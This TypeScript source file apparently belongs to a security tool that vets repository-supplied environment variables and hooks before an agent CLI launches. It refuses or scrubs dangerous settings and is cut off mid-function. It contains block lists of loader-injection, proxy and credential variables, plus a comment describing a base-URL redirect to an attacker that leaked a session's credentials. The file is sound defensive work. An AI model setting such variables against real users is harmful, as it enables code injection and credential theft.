// enclawed adapter kit: environment trust for repository-supplied settings.
//
// Agent CLIs apply an `env` block from every settings file they merge, and a
// repository's own settings file is one of them, to the CLI process and to
// everything it starts. A committed `"env": { "ANTHROPIC_BASE_URL":
// "https://attacker" }` sent a whole agent session, credentials included,
// to an attacker (CVE-2026-21852); a proxy, a CA bundle, an API
// key, a telemetry endpoint, a package index or a preloaded library does the
// same in other ways. So a repository that sets a variable of a class below
// (`destination`, `trust`, `credential`, `load`, `telemetry`) refuses the
// launch, unless its value can never take effect (a higher settings source
// sets the same name) or equals the value the session would have anyway. The
// same variables from the user's own shell, user settings, launcher flags or
// the organization's managed settings are the user's (or administrator's)
// choice: kept, and recorded (credential values as digests only).
//
// Classification is by name (segments and substrings, so the variables of
// tools the agent runs, such as PIP_INDEX_URL, GOPROXY or REQUESTS_CA_BUNDLE,
// are covered too), except for model variables, whose value decides (a plain
// model id stays with the provider; an ARN or a URL does not). The names are
// host-neutral; a host adds its own provider switches through `extra`.
//
// Ported from codenclawed's claude-env.mjs and session.mjs (repositoryEnv).

import { createHash } from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { isInside, realpathNearestSync } from "./fs-probe.js";
import { textOf } from "./untrusted.js";

export type EnvClass =
  | "destination"
  | "trust"
  | "credential"
  | "load"
  | "telemetry"
  /** Selects the user's own provider (a provider switch, a region, a project id), with no endpoint and no credential: started, and recorded. */
  | "provider"
  | "benign";

/** Classes whose repository-supplied value refuses the launch. */
export const REFUSED_ENV_CLASSES: readonly EnvClass[] = [
  "destination",
  "trust",
  "credential",
  "load",
  "telemetry",
];

/**
 * Loader-injection variables: they make the dynamic loader map a library into
 * the host CLI itself and every process it starts. Removed from what the
 * launcher starts unless an administrator grants them. LD_LIBRARY_PATH and the
 * DYLD_*_PATH search paths are not here (module systems set them for real
 * work); from a repository they are refused like every other `load` variable.
 */
export const LOADER_INJECTION_ENV: readonly string[] = [
  "LD_PRELOAD",
  "LD_AUDIT",
  "DYLD_INSERT_LIBRARIES",
];

const MODEL_VARS = /(^|_)MODEL(_FORCE|_OPTION)?$/;
const NUMERIC_SUFFIX =
  /_(MS|S|SECONDS|MINUTES|TIMEOUT|TOKENS|THRESHOLD|LIMIT|BUDGET|COUNT|LENGTH|SIZE|CONCURRENCY|RETRIES|INTERVAL|PCT|PCT_OVERRIDE|LIMIT_OVERRIDE|DEPTH|WIDTH|PERCENT|ONE_IN|TURNS|GIB)$/;

const DESTINATION_SEGMENTS = new Set([
  "URL",
  "URLS",
  "URI",
  "HOST",
  "HOSTS",
  "HOSTNAME",
  "ENDPOINT",
  "ENDPOINTS",
  "BASE",
  "ORIGIN",
  "SOCKET",
  "SOCK",
  "PORT",
  "IP",
  "ADDR",
  "ADDRESS",
  "SERVER",
  "REGISTRY",
  "REGISTRIES",
  "MIRROR",
  "INDEX",
  "DOMAIN",
  "GATEWAY",
  "REGION",
  "LOCATION",
  "ZONE",
  "PUBLISH",
  "SHARE",
  "RELAY",
  "TUNNEL",
  "BRIDGE",
  "REMOTE",
  "INGRESS",
  "UPSTREAM",
  "WEBHOOK",
  "METADATA",
]);
// Go module fetching: what is fetched without the checksum database.
const DESTINATION_NAMES = new Set([
  "GOSUMDB",
  "GONOSUMDB",
  "GONOSUMCHECK",
  "GOPRIVATE",
  "GOTOOLCHAIN",
]);
const TRUST_SUBSTRINGS = [
  "CERT",
  "TLS",
  "SSL",
  "INSECURE",
  "VERIFY",
  "CAINFO",
  "CAPATH",
  "CA_BUNDLE",
  "MTLS",
  "TRUST",
  "KEYLOG",
  "PINNING",
];
const TRUST_SEGMENTS = new Set([
  "CA",
  "SETTINGS",
  "POLICY",
  "SCRUB",
  "INHERIT",
  "SANDBOX",
  "SANDBOXED",
  "CONFINED",
  "PERMISSION",
  "PERMISSIONS",
]);
// Where configuration, credentials and settings are read from.
const TRUST_NAMES = new Set([
  "XDG_CONFIG_HOME",
  "KUBECONFIG",
  "CLOUDSDK_CONFIG",
  "CURL_HOME",
  "WGETRC",
  "NETRC",
  "GNUPGHOME",
  "APPDATA",
  "LOCALAPPDATA",
  "ALLUSERSPROFILE",
  "PROGRAMDATA",
  "USERPROFILE",
  "HOMEDRIVE",
  "HOMEPATH",
]);
const CREDENTIAL_SEGMENTS = new Set([
  "KEY",
  "KEYS",
  "TOKEN",
  "SECRET",
  "SECRETS",
  "PASSWORD",
  "PASSWD",
  "PASSPHRASE",
  "CREDENTIAL",
  "CREDENTIALS",
  "CREDS",
  "BEARER",
  "OAUTH",
  "AUTH",
  "AUTHORIZATION",
  "COOKIE",
  "COOKIES",
  "PROFILE",
  "ACCOUNT",
  "ORGANIZATION",
  "ORG",
  "WORKSPACE",
  "TENANT",
  "PROJECT",
  "FEDERATION",
  "IDENTITY",
  "ROLE",
  "HEADERS",
  "HEADER",
  "UUID",
  "SCOPES",
  "CREDMAN",
  "KEYCHAIN",
  "KEYRING",
  "CLIENT",
  "SESSION",
  "SCOPE",
  "EMAIL",
]);
const CREDENTIAL_PREFIXES =
  /^(AZURE_|AWS_|GOOGLE_|GCLOUD_|GH_|GITHUB_|ANTHROPIC_(API|AUTH|FOUNDRY|AWS|IDENTITY|ORGANIZATION|WORKSPACE|PROFILE|FEDERATION|ENVIRONMENT)|OPENAI_|GEMINI_|COPILOT_)/;
const LOAD_SEGMENTS = new Set([
  "PRELOAD",
  "PATH",
  "PATHS",
  "DIR",
  "DIRS",
  "HOME",
  "ROOT",
  "EXEC",
  "BIN",
  "BINARY",
  "SHELL",
  "BROWSER",
  "EDITOR",
  "COMMAND",
  "CMD",
  "HELPER",
  "WRAPPER",
  "PREFIX",
  "HOOK",
  "HOOKS",
  "PLUGIN",
  "PLUGINS",
  "MODULE",
  "MODULES",
  "LIBRARY",
  "LIB",
  "LIBS",
  "INSERT",
  "INTERPOSE",
  "LOADER",
  "LOADABLES",
  "OPTIONS",
  "OPTS",
  "FLAGS",
  "STARTUP",
  "INIT",
  "FILE",
  "CONFIG",
  "B64",
  "BUNDLE",
  "INSPECT",
  "INSPECTOR",
  "TMPDIR",
  "ROOTS",
  "EXECPATH",
]);
const LOAD_PREFIXES = /^(LD_|DYLD_|BUN_)/;
const LOAD_INTERPRETER = new Set([
  "NODE_OPTIONS",
  "NODE_PATH",
  "NODE_REPL_EXTERNAL_MODULE",
  "PYTHONPATH",
  "PYTHONSTARTUP",
  "PYTHONHOME",
  "PYTHONUSERBASE",
  "PYTHONEXECUTABLE",
  "PERL5OPT",
  "PERL5LIB",
  "PERLLIB",
  "PERL5DB",
  "RUBYOPT",
  "RUBYLIB",
  "LESSOPEN",
  "LESSCLOSE",
  "PAGER",
  "VISUAL",
  "PS4",
  "SHELLOPTS",
  "BASHOPTS",
  "JAVA_TOOL_OPTIONS",
  "_JAVA_OPTIONS",
]);
const LOAD_NAMES = new Set([
  "ZDOTDIR",
  "SHELL",
  "TMPDIR",
  "TEMP",
  "TMP",
  "BASH_ENV",
  "ENV",
  "PROMPT_COMMAND",
  "GOFLAGS",
  "GOPATH",
  "GOROOT",
  "CFLAGS",
  "CXXFLAGS",
  "LDFLAGS",
  "CPPFLAGS",
  "RUSTFLAGS",
  "RUSTC_WRAPPER",
  "MAVEN_OPTS",
  "GRADLE_OPTS",
]);
const TELEMETRY_SEGMENTS = new Set(["TELEMETRY", "TRACING", "DATADOG", "SENTRY", "OTEL", "OTLP"]);

/** Host-specific additions: names a host reads that the generic rules would not classify. */
export type EnvClassExtra = Readonly<{
  /** Benign despite a matching segment (what the host reports about itself, or a plain switch). */
  benign?: readonly string[];
  /** The host's provider switches and request-body passthroughs (where the session's traffic goes). */
  destination?: readonly string[];
  /** The host's settings-source switches (what is trusted). */
  trust?: readonly string[];
  /**
   * The host's provider switches that only select a provider the user's own
   * credentials reach (no endpoint, no credential): accepted from a
   * repository with an on/off value, and recorded.
   */
  providerSwitches?: readonly string[];
}>;

/**
 * Known hosts' own names, kept here (in Enclawed) rather than in each
 * adapter, so an adapter that forgets one does not weaken the check. Keyed by
 * the adapter's host id.
 */
export const KNOWN_HOST_ENV: Readonly<Record<string, EnvClassExtra>> = {
  "claude-code": {
    benign: [
      "CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR",
      "CLAUDE_CODE_SESSION_KIND",
      "CLAUDE_CODE_CHILD_SESSION",
      "CLAUDE_CODE_SKIP_PROMPT_HISTORY",
      "CLAUDE_CODE_ENABLE_TOKEN_USAGE_ATTACHMENT",
      "CLAUDE_CODE_DISABLE_NESTED_SESSION_ID",
    ],
    providerSwitches: [
      "CLAUDE_CODE_USE_BEDROCK",
      "CLAUDE_CODE_USE_VERTEX",
      "CLAUDE_CODE_USE_FOUNDRY",
      "CLAUDE_CODE_USE_ANTHROPIC_AWS",
      "CLAUDE_CODE_USE_ANTHROPIC_GOOGLE_CLOUD",
    ],
    destination: [
      // Provider switches: the session goes to another provider's endpoint.
      "CLAUDE_CODE_USE_BEDROCK",
      "CLAUDE_CODE_USE_VERTEX",
      "CLAUDE_CODE_USE_FOUNDRY",
      "CLAUDE_CODE_USE_MANTLE",
      "CLAUDE_CODE_USE_ANTHROPIC_AWS",
      "CLAUDE_CODE_USE_ANTHROPIC_GOOGLE_CLOUD",
      "CLAUDE_CODE_USE_GATEWAY",
      "CLAUDE_CODE_USE_CCR_V2",
      // Extra request-body fields reach the API as they are.
      "CLAUDE_CODE_EXTRA_BODY",
      // Account-level connectors are remote MCP servers.
      "ENABLE_CLAUDEAI_MCP_SERVERS",
      "CLAUDE_CODE_MCP_ALLOWLIST_ENV",
    ],
    trust: [
      "CLAUDE_PROJECT_DIR",
      "CLAUDE_CODE_DISABLE_ADMIN_ENV_UNION",
      "CLAUDE_CODE_ENVIRONMENT_KIND",
      "CLAUDE_CODE_MOCK_REMOTE_SETTINGS",
    ],
  },
};

/** The extra names for a host: its known table merged with the adapter's own additions. */
export function hostEnvExtra(host: string, own: EnvClassExtra = {}): EnvClassExtra {
  const k = Object.hasOwn(KNOWN_HOST_ENV, host) ? KNOWN_HOST_ENV[host] : {};
  return {
    benign: [...(k.benign ?? []), ...(own.benign ?? [])],
    destination: [...(k.destination ?? []), ...(own.destination ?? [])],
    trust: [...(k.trust ?? []), ...(own.trust ?? [])],
    providerSwitches: [...(k.providerSwitches ?? []), ...(own.providerSwitches ?? [])],
  };
}

/** A provider's region names (generic: the cloud SDKs read them). */
const PROVIDER_REGION_NAMES: ReadonlySet<string> = new Set([
  "AWS_REGION",
  "AWS_DEFAULT_REGION",
  "CLOUD_ML_REGION",
]);
const PROVIDER_REGION_PREFIX = /^VERTEX_REGION_[A-Z0-9_]+$/;
/** A project id that selects the user's own cloud project. */
const PROVIDER_PROJECT_NAMES: ReadonlySet<string> = new Set(["ANTHROPIC_VERTEX_PROJECT_ID"]);
const SWITCH_VALUE = /^(1|0|true|false|yes|no|on|off)$/i;
// A region id (us-east-1, us-east5, europe-west4, global): letters, digits and dashes, no host, no URL.
const REGION_VALUE = /^(global|[a-z]{2,}(?:-[a-z0-9]+){1,3})$/;
// A GCP project id: 6 to 30 characters, lowercase letters, digits and dashes.
const PROJECT_VALUE = /^[a-z][a-z0-9-]{4,28}[a-z0-9]$/;

/**
 * A value that only selects which of the user's own providers, regions or
 * projects the session uses: a provider switch set on or off, a region id, a
 * project id. Anything else (a URL, a host, an ARN, a credential) is not.
 */
function providerSelection(n: string, value: string, extra: EnvClassExtra): boolean {
  const v = value.trim();
  if (extra.providerSwitches?.includes(n)) {
    return SWITCH_VALUE.test(v);
  }
  if (PROVIDER_REGION_NAMES.has(n) || PROVIDER_REGION_PREFIX.test(n)) {
    return REGION_VALUE.test(v);
  }
  if (PROVIDER_PROJECT_NAMES.has(n)) {
    return PROJECT_VALUE.test(v);
  }
  return false;
}

const segmentsOf = (n: string) => n.split("_").filter(Boolean);
const hasSegment = (segs: readonly string[], set: ReadonlySet<string>) =>
  segs.some((s) => set.has(s));

/** Is `name` credential-shaped (its value is never written to the audit log)? */
export function credentialLike(name: string, extra: EnvClassExtra = {}): boolean {
  const n = name.toUpperCase();
  if (extra.benign?.includes(n)) {
    return false;
  }
  return (
    hasSegment(segmentsOf(n), CREDENTIAL_SEGMENTS) ||
    /(TOKEN|SECRET|PASSWORD|PASSWD|APIKEY|_KEY$)/.test(n)
  );
}

export type EnvClassification = Readonly<{ class: EnvClass; why: string }>;

/** The class of one variable; only model variables look at the value. */
export function classifyEnv(
  name: string,
  value?: string,
  extra: EnvClassExtra = {},
): EnvClassification {
  const n = name.toUpperCase();
  const segs = segmentsOf(n);
  if (extra.benign?.includes(n)) {
    return { class: "benign", why: "a behavior switch" };
  }
  if (typeof value === "string" && providerSelection(n, value, extra)) {
    return {
      class: "provider",
      why: "selects the user's own provider, region or project (no endpoint, no credential)",
    };
  }
  if (MODEL_VARS.test(n)) {
    const v = typeof value === "string" ? value.trim() : "";
    return /^arn:|:\/\/|^\/|\\/i.test(v)
      ? {
          class: "destination",
          why: "a model value that names a resource or location, not a model id",
        }
      : { class: "benign", why: "a model id" };
  }
  const trustNamed = TRUST_NAMES.has(n) || Boolean(extra.trust?.includes(n));
  if (
    (segs.includes("DISABLE") || n === "DO_NOT_TRACK") &&
    !trustNamed &&
    !TRUST_SUBSTRINGS.some((x) => n.includes(x))
  ) {
    // Switching something off; the weakening ones (a certificate check) are trust, below.
    return { class: "benign", why: "switches a feature off" };
  }
  if (n.startsWith("OTEL_") || hasSegment(segs, TELEMETRY_SEGMENTS)) {
    return { class: "telemetry", why: "what is exported as telemetry, and where" };
  }
  if (n.includes("PROXY")) {
    return { class: "destination", why: "a proxy: where traffic goes" };
  }
  if (DESTINATION_NAMES.has(n) || extra.destination?.includes(n)) {
    return { class: "destination", why: "where the session's traffic goes" };
  }
  if (
    trustNamed ||
    TRUST_SUBSTRINGS.some((s) => n.includes(s)) ||
    hasSegment(segs, TRUST_SEGMENTS)
  ) {
    return {
      class: "trust",
      why: "what is trusted (certificates, TLS verification, settings and trust sources)",
    };
  }
  if (NUMERIC_SUFFIX.test(n)) {
    return { class: "benign", why: "a number or a duration" };
  }
  if (hasSegment(segs, DESTINATION_SEGMENTS)) {
    return { class: "destination", why: "an address, endpoint or region" };
  }
  if (credentialLike(n, extra) || CREDENTIAL_PREFIXES.test(n)) {
    return { class: "credential", why: "whose credentials or account are used" };
  }
  if (
    LOAD_NAMES.has(n) ||
    LOAD_INTERPRETER.has(n) ||
    LOAD_PREFIXES.test(n) ||
    hasSegment(segs, LOAD_SEGMENTS)
  ) {
    return { class: "load", why: "what code, binaries or configuration are loaded or run" };
  }
  return {
    class: "benign",
    why: "a behavior switch that does not change where traffic goes, what is trusted or what is loaded",
  };
}

export function isRefusedEnvClass(c: EnvClass): boolean {
  return REFUSED_ENV_CLASSES.includes(c);
}

/** What the audit log may hold of a value: userinfo removed from URLs, bounded; credentials as a digest only. */
export function recordableEnvValue(
  name: string,
  value: unknown,
): { value?: string; digest: string } {
  const s = textOf(value ?? "");
  const digest = createHash("sha256").update(s).digest("hex").slice(0, 16);
  if (credentialLike(name)) {
    return { digest };
  }
  return {
    value: s.replace(/(\b[a-z][a-z0-9+.-]*:\/\/)[^/@\s]*@/gi, "$1<userinfo>@").slice(0, 300),
    digest,
  };
}

/**
 * Names that change what the commands the gate treats as read-only would do
 * (a PATH, a shell startup file, a pager, an interpreter option). When a
 * lower settings file sets one the launcher did not pin, even a read-only
 * command is irreversible (the engine's `shellEnvRisk`).
 */
export function changesShellCommands(name: string, hostPrefixes: readonly string[] = []): boolean {
  const n = name.toUpperCase();
  if (
    // BASH_FUNC_NAME%%: a function every bash the command starts imports (./shell-definitions.ts).
    /^(ENCLAWED_|ENCLAWEDER_|NODE_|NPM_CONFIG_|LD_|DYLD_|GIT_|BASH_FUNC_)/.test(n) ||
    hostPrefixes.some((p) => n.startsWith(p))
  ) {
    return true;
  }
  return [
    "PATH",
    "HOME",
    "TMPDIR",
    "BASH_ENV",
    "ENV",
    "PROMPT_COMMAND",
    "SHELLOPTS",
    "BASHOPTS",
    "PS4",
    "PAGER",
    "EDITOR",
    "VISUAL",
    "PYTHONPATH",
    "PYTHONSTARTUP",
    "PERL5OPT",
    "PERL5LIB",
    "RUBYOPT",
    "LESSOPEN",
    "LESSCLOSE",
    "XDG_RUNTIME_DIR",
  ].includes(n);
}

// ─── The repository-env decision ────────────────────────────────────────

/** One settings source's env block. */
export type EnvSource = Readonly<{
  /** Where it comes from, for the message and the record (a file path, "shell", ...). */
  origin: string;
  env: Readonly<Record<string, unknown>>;
}>;

export type RepositoryEnvInput = Readonly<{
  /**
   * The repository's settings env blocks, LOWEST rank first (a later block
   * overrides an earlier one for the same name, as the host merges them).
   */
  repository: readonly EnvSource[];
  /** Sources that outrank the repository (managed settings, the launcher's own settings flag): a name set there never takes effect from the repository. */
  higher: readonly EnvSource[];
  /** The user's own values (shell environment, user settings): a repository value equal to one of them changes nothing. */
  user: readonly EnvSource[];
  /** Names the launcher pins to its own value anyway (they cannot take effect); destination, trust and credential names are never exempt. */
  launcherPinned?: (name: string) => boolean;
  extra?: EnvClassExtra;
}>;

export type EnvRefusal = Readonly<{ origin: string; name: string; class: EnvClass; why: string }>;

export type EnvOrigin = Readonly<{
  name: string;
  origin: string;
  class: EnvClass;
  outcome: "kept" | "shadowed" | "same-as-user" | "accepted";
  value?: string;
  digest: string;
}>;

/** Worth a record: what changes where traffic goes, what is trusted, whose account, telemetry, injected code. */
function recordWorthy(name: string, value: string, extra: EnvClassExtra): EnvClass | null {
  const c = classifyEnv(name, value, extra).class;
  if (
    c === "destination" ||
    c === "trust" ||
    c === "credential" ||
    c === "telemetry" ||
    c === "provider"
  ) {
    return c;
  }
  const loads =
    /^(LD_|DYLD_|NODE_OPTIONS$|NODE_PATH$|BUN_OPTIONS$|JAVA_TOOL_OPTIONS$|_JAVA_OPTIONS$|PYTHONPATH$|PYTHONSTARTUP$|PERL5OPT$|PERL5LIB$|RUBYOPT$|ZDOTDIR$|BASH_ENV$|ENV$)/;
  return c === "load" && loads.test(name.toUpperCase()) ? c : null;
}

/**
 * Decide the repository's env: every refused name (the launch must not
 * start while any remains), and what each source sets of the recorded
 * classes (for the session-start record).
 */
export function decideRepositoryEnv(input: RepositoryEnvInput): {
  refusals: EnvRefusal[];
  origins: EnvOrigin[];
} {
  const extra = input.extra ?? {};
  const effective = new Map<string, { origin: string; value: string }>();
  for (const src of input.repository) {
    for (const [name, v] of Object.entries(src.env)) {
      effective.set(name, { origin: src.origin, value: textOf(v) });
    }
  }
  const has = (list: readonly EnvSource[], name: string) =>
    list.some((s) => Object.hasOwn(s.env, name));
  const userValue = (name: string): string | undefined => {
    let v: string | undefined;
    for (const s of input.user) {
      if (Object.hasOwn(s.env, name) && s.env[name] !== undefined) {
        v = textOf(s.env[name]);
      }
    }
    return v;
  };
  const refusals: EnvRefusal[] = [];
  const origins: EnvOrigin[] = [];
  const note = (name: string, value: string, origin: string, outcome: EnvOrigin["outcome"]) => {
    const c = recordWorthy(name, value, extra);
    if (c) {
      origins.push({ name, origin, class: c, outcome, ...recordableEnvValue(name, value) });
    }
  };
  for (const name of [...effective.keys()].toSorted()) {
    const { origin, value } = effective.get(name) as { origin: string; value: string };
    const c = classifyEnv(name, value, extra);
    if (!isRefusedEnvClass(c.class)) {
      if (c.class === "provider") {
        // Started, and recorded in the session-start record.
        note(name, value, origin, "accepted");
      }
      continue;
    }
    if (input.launcherPinned?.(name) && !["destination", "trust", "credential"].includes(c.class)) {
      continue;
    }
    if (has(input.higher, name)) {
      note(name, value, origin, "shadowed");
      continue;
    }
    const mine = userValue(name);
    if (mine !== undefined && mine === value) {
      note(name, value, origin, "same-as-user");
      continue;
    }
    refusals.push({ origin, name, class: c.class, why: c.why });
  }
  for (const src of [...input.user, ...input.higher]) {
    for (const [name, value] of Object.entries(src.env)) {
      if (typeof value === "string") {
        note(name, value, src.origin, "kept");
      }
    }
  }
  return { refusals, origins };
}

const CLASS_EFFECT: Readonly<Record<EnvClass, string>> = {
  destination: "it changes where the agent or the commands it runs send traffic",
  trust: "it changes what the agent or the commands it runs trust",
  credential: "it changes whose credentials or account the session uses",
  load: "it changes what code the agent or the commands it runs load",
  telemetry: "it changes what the session exports as telemetry, and where",
  provider: "it selects which of the user's own providers the session uses",
  benign: "it changes nothing that matters here",
};

/** The refusal message for the first refusal, in plain words. */
export function repositoryEnvMessage(refusals: readonly EnvRefusal[], app = "Enclawed"): string {
  const r = refusals[0];
  if (!r) {
    return "";
  }
  const more =
    refusals.length > 1
      ? ` (and ${refusals.length - 1} more: ${refusals
          .slice(1, 5)
          .map((x) => x.name)
          .join(", ")})`
      : "";
  return (
    `${r.origin} sets ${r.name} in its env; ${CLASS_EFFECT[r.class]} (${r.why}). A repository's settings must not do that, so ${app} refuses to start${more}. ` +
    `If you mean to use it, set ${r.name} yourself, in your shell or your own user settings, and remove it from the repository's settings`
  );
}

/** `env` without the loader-injection variables, except those an administrator granted (exact upper-case name). */
export function scrubLoaderEnv(
  env: Readonly<Record<string, string | undefined>>,
  granted: readonly string[] = [],
): { env: Record<string, string | undefined>; removed: string[]; granted: string[] } {
  const out: Record<string, string | undefined> = { ...env };
  const removed: string[] = [];
  const kept: string[] = [];
  for (const k of Object.keys(env)) {
    // Any case: on Windows names are case-insensitive.
    const upper = k.toUpperCase();
    if (!LOADER_INJECTION_ENV.includes(upper)) {
      continue;
    }
    if (granted.includes(upper) && k === upper) {
      kept.push(k);
    } else {
      delete out[k];
      removed.push(k);
    }
  }
  return { env: out, removed: removed.toSorted(), granted: kept.toSorted() };
}

// ─── Hook admission in every scope ──────────────────────────────────────

/**
 * Where a hook comes from. Every hook a host would run besides Enclawed's own
 * runs outside Enclawed's checks, so whatever its scope it must be granted by
 * digest, or the launch does not start. Only the administrator's managed
 * settings are exempt (they are the administrator's decision already).
 */
export type HookScope =
  | "managed"
  | "user"
  | "project"
  | "local"
  | "plugin"
  | "settings-flag"
  | "frontmatter"
  | "other";

export type HookEntry = Readonly<{
  scope: HookScope;
  /** The file it is defined in (absolute), or a label for a settings value. */
  file: string;
  event: string;
  matcher?: unknown;
  /** The whole hook entry as the host reads it. */
  value: unknown;
  /**
   * The words the host expands before it runs a hook command: `~` and $HOME
   * (when `home` is given) and each named variable ($NAME, ${NAME}) at the
   * start of a word, bound to the path it stands for in this entry (for
   * example a project-folder variable). The digest then covers the
   * files the command really runs. The variable names are host data.
   */
  expand?: HookExpansion;
}>;

export type HookExpansion = Readonly<{
  home?: string | null;
  vars?: Readonly<Record<string, string | null | undefined>>;
}>;

const VAR_NAME = /^[A-Za-z_][A-Za-z0-9_]*$/;

/**
 * Every string in `value` with the leading shell words the host expands
 * replaced by the absolute paths they name (see HookEntry.expand). Only the
 * words change; separators stay.
 */
export function expandHookWords(value: unknown, x: HookExpansion): unknown {
  const vars = Object.entries(x.vars ?? {}).filter(
    (e): e is [string, string] => VAR_NAME.test(e[0]) && typeof e[1] === "string" && e[1] !== "",
  );
  const word = (w: string): string => {
    let out = w;
    if (x.home) {
      out = out.replace(/^~(?=\/|$)/, x.home).replace(/^\$\{?HOME\}?(?=\/|$)/, x.home);
    }
    for (const [name, to] of vars) {
      out = out.replace(new RegExp(`^\\$\\{?${name}\\}?(?=/|$)`), to);
    }
    return out;
  };
  const walk = (v: unknown): unknown => {
    if (typeof v === "string") {
      return v.replace(/[^\s;|&()<>`'"=]+/g, word);
    }
    if (Array.isArray(v)) {
      return v.map(walk);
    }
    if (v && typeof v === "object") {
      return Object.fromEntries(Object.entries(v).map(([k, y]) => [k, walk(y)]));
    }
    return v;
  };
  return walk(value);
}

/** A grant: one hook, by digest; repository grants also name the repository. */
export type HookGrant = Readonly<{ digest: string; repo?: string; scope?: HookScope }>;

export type HookRefusal = Readonly<{
  scope: HookScope;
  file: string;
  event: string;
  digest: string | null;
  why: string;
  /** The grant an administrator adds to allow exactly this hook (a changed hook needs a new one). */
  grant: HookGrant | null;
}>;

const MAX_REFERENCED_FILES = 64;
const MAX_REFERENCED_BYTES = 64 * 1024 * 1024;

function stringsIn(v: unknown, out: string[] = []): string[] {
  if (typeof v === "string") {
    out.push(v);
  } else if (Array.isArray(v)) {
    for (const x of v) {
      stringsIn(x, out);
    }
  } else if (v && typeof v === "object") {
    for (const x of Object.values(v)) {
      stringsIn(x, out);
    }
  }
  return out;
}

/** Canonical JSON (object keys sorted, recursively): the form every grant digest hashes. */
export function canonicalOf(v: unknown): string {
  if (Array.isArray(v)) {
    return `[${v.map(canonicalOf).join(",")}]`;
  }
  if (v && typeof v === "object") {
    const o = v as Record<string, unknown>;
    return `{${Object.keys(o)
      .toSorted()
      .map((k) => `${JSON.stringify(k)}:${canonicalOf(o[k])}`)
      .join(",")}}`;
  }
  return JSON.stringify(v ?? null);
}

/**
 * Files a hook command names inside `base`, with their
 * digests: editing the script a hook runs needs a new grant too.
 */
export function referencedFilesIn(
  value: unknown,
  base: string,
  projectVar: string[],
): { path: string; sha256: string }[] {
  const root = realpathNearestSync(path.resolve(base));
  const seen = new Map<string, string>();
  for (const s of stringsIn(value)) {
    for (const raw of s.split(/[\s;|&()<>`'"=]+/)) {
      if (!raw) {
        continue;
      }
      let word = raw;
      for (const v of projectVar) {
        word = word.replace(new RegExp(`^\\$\\{?${v}\\}?(?=/|$)`), root);
      }
      const abs = realpathNearestSync(path.resolve(root, word));
      // Files inside the hook's own base (the project, or the plugin's directory):
      // system programs are not part of the digest, so updating them needs no new grant.
      if (abs === root || seen.has(abs) || !isInside(root, abs)) {
        continue;
      }
      let st: fs.Stats;
      try {
        st = fs.statSync(abs);
      } catch {
        continue;
      }
      if (!st.isFile()) {
        continue;
      }
      if (seen.size >= MAX_REFERENCED_FILES) {
        throw new Error(
          `the hook names more than ${MAX_REFERENCED_FILES} files; it cannot be granted`,
        );
      }
      if (st.size > MAX_REFERENCED_BYTES) {
        throw new Error(
          `${abs} is larger than ${MAX_REFERENCED_BYTES} bytes; a hook that runs it cannot be granted`,
        );
      }
      seen.set(abs, createHash("sha256").update(fs.readFileSync(abs)).digest("hex"));
    }
  }
  return [...seen.entries()]
    .map(([abs, sha256]) => ({ path: path.relative(root, abs), sha256 }))
    .toSorted((a, b) => a.path.localeCompare(b.path));
}

/**
 * The grant digest of one hook: its scope, its file (relative to the project
 * for repository hooks), its event and matcher, its whole value, and the
 * content of every file it names.
 */
export function hookDigest(
  h: HookEntry,
  o: { projectDir: string; projectVars?: readonly string[] },
): string {
  const repo = h.scope === "project" || h.scope === "local";
  const base = repo ? o.projectDir : path.isAbsolute(h.file) ? path.dirname(h.file) : o.projectDir;
  const root = realpathNearestSync(path.resolve(o.projectDir));
  const file =
    repo && path.isAbsolute(h.file) ? path.relative(root, realpathNearestSync(h.file)) : h.file;
  const value = h.expand ? expandHookWords(h.value ?? null, h.expand) : (h.value ?? null);
  const doc = {
    v: 1,
    kind: "hook",
    scope: h.scope,
    file,
    event: h.event,
    matcher: h.matcher ?? null,
    value,
    files: [
      ...referencedFilesIn(value, base, [...(o.projectVars ?? []), "ENCLAWED_PROJECT_DIR"]),
      // A directory the host binds a variable to (a plugin's root) is the
      // hook's own too: the scripts it runs from there are covered.
      ...Object.entries(h.expand?.vars ?? {})
        .filter((e): e is [string, string] => typeof e[1] === "string" && e[1] !== "")
        .toSorted((a, b) => (a[0] < b[0] ? -1 : 1))
        .flatMap(([name, dir]) =>
          referencedFilesIn(value, dir, []).map((f) => ({ ...f, path: `$${name}/${f.path}` })),
        ),
    ],
  };
  return createHash("sha256").update(canonicalOf(doc)).digest("hex");
}

/**
 * Hook admission for a launch: every hook from any scope but the
 * administrator's managed settings must be granted by digest (repository
 * hooks by a grant for this repository). Any refusal: the launch must not
 * start. Enclawed's own hook is never in `hooks` (the adapter adds it after
 * this decision, in a file of its own session).
 */
export function decideHooks(
  hooks: readonly HookEntry[],
  grants: readonly HookGrant[],
  o: { projectDir: string; projectVars?: readonly string[] },
): { ok: boolean; refusals: HookRefusal[] } {
  const repo = realpathNearestSync(path.resolve(o.projectDir));
  const refusals: HookRefusal[] = [];
  for (const h of hooks) {
    if (h.scope === "managed") {
      continue;
    }
    let digest: string;
    try {
      digest = hookDigest(h, o);
    } catch (err) {
      refusals.push({
        scope: h.scope,
        file: h.file,
        event: h.event,
        digest: null,
        why: (err as Error).message,
        grant: null,
      });
      continue;
    }
    const repoScoped = h.scope === "project" || h.scope === "local";
    const grant: HookGrant = repoScoped ? { repo, digest } : { scope: h.scope, digest };
    const granted = grants.some(
      (g) =>
        g.digest === digest &&
        (repoScoped
          ? g.repo === repo
          : g.repo === undefined && (g.scope === undefined || g.scope === h.scope)),
    );
    if (!granted) {
      refusals.push({
        scope: h.scope,
        file: h.file,
        event: h.event,
        digest,
        why: `a ${h.scope} hook for ${h.event} would run outside Enclawed's checks`,
        grant,
      });
    }
  }
  return { ok: refusals.length === 0, refusals };
}

/**
 * Grants that match no hook present now (their hook changed, its digest
 * rule changed, or it is gone): an administrator removes them, and adds the
 * grant decideHooks names for the hook as it is now. `hooks` is every hook
 * the host would run from any scope, as for decideHooks; grants for another
 * repository are left out.
 */
export function staleHookGrants(
  hooks: readonly HookEntry[],
  grants: readonly HookGrant[],
  o: { projectDir: string; projectVars?: readonly string[] },
): HookGrant[] {
  const live = new Set<string>();
  for (const h of hooks) {
    try {
      live.add(hookDigest(h, o));
    } catch {
      /* a hook that cannot be granted matches no grant */
    }
  }
  // A repository grant for another repository is not this project's to judge.
  const repo = realpathNearestSync(path.resolve(o.projectDir));
  return grants.filter((g) => (g.repo === undefined || g.repo === repo) && !live.has(g.digest));
}

/** The refusals in plain words, with the grant to add for each. */
export function hooksMessage(refusals: readonly HookRefusal[]): string {
  return [
